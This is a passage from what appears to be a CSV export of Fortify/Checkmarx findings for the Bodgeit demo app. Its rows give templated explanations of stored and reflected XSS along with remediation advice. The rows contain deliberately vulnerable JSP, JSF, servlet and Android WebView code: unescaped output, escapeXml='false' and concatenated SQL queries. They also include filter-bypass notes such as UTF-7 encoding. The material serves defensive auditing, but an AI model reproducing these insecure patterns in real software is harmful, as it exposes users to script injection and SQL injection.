HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","263","Cross-Site Scripting: Persistent","","Critical","Open","2015-10-15","Fortify SCA,Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/header.jsp","","","http://localhost/root/header.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Persistent (also known as Stored) XSS, the untrusted source is typically a database or other back-end datastore, while in the case of Reflected XSS it is typically a web request. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt;</pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> This code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt;</pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","249","Cross-Site Scripting: Reflected","","Critical","Open","2015-10-15","Fortify SCA","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/header.jsp","username","","http://localhost/root/header.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Reflected XSS, the untrusted source is typically a web request, while in the case of Persisted (also known as Stored) XSS it is typically a database or other back-end datastore. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl/fmt/message sink:jspwriter""> <b>Example 1:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP request, then checks the value for this key in bundle. If the key doesn't exist, the default functionality is to print the key to the user. <pre> &lt;fmt:setLocale value=""en""/&gt; &lt;fmt:setBundle basename=""com.company.Names"" var=""names""/&gt; Employee ID: &lt;fmt:message key=""${param.eid}"" bundle=""${names}""/&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> </Paragraph></IfDef> The code in this example operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet's response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl/fmt/message sink:jspwriter""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and looks up the corresponding employee's name in a bundle via the <code>key</code> attribute within the <code>&lt;fmt:message/&gt;</code> tag. If the key does not exist, the value passed to <code>key</code> gets printed to the page. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; &lt;fmt:setLocale value=""en""/&gt; &lt;fmt:setBundle basename=""com.company.Names"" var=""names""/&gt; Employee Name: &lt;fmt:message key=""&lt;%= name %&gt;"" bundle=""${names}""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""/&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an 